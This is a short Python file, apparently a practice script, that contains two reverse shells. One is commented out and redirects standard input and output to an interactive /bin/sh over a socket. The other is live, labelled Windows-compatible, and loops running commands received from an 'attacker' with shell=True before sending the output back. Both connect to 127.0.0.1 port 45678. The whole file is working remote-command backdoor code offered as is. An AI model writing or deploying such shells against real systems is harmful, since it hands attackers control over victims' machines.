# import socket
# import subprocess
# import os

# sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 1
# sock.connect(("127.0.0.1", 45678))                        # 2
# sock.send(b'[*] Connection Established')                  # 3

# os.dup2(sock.fileno(), 0)  # Redirect STDIN   ↘️           # 4
# os.dup2(sock.fileno(), 1)  # Redirect STDOUT  ↘️           # 5
# os.dup2(sock.fileno(), 2)  # Redirect STDERR  ↘️           # 6

# shell_remote = subprocess.call(["/bin/sh", "-i"])         # 7
# proc = subprocess.call(["/bin/ls", "-i"])                 # 8


# WINDOWS-COMPATIBLE REVERSE SHELL (PYTHON)
print("WINDOWS-COMPATIBLE REVERSE SHELL (PYTHON)/n")


import socket
import subprocess

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 45678))

    # Loop to keep the shell running
    while True:
        # Receive command from attacker
        command = s.recv(1024).decode("utf-8")

        if command.lower() == "exit":
            break  # Close connection if 'exit' command received

        # Execute the command
        output = subprocess.run(command, shell=True, capture_output=True)

        # Send back the output
        result = output.stdout + output.stderr
        s.send(result if result else b"Command executed with no output.")

    s.close()

connect()
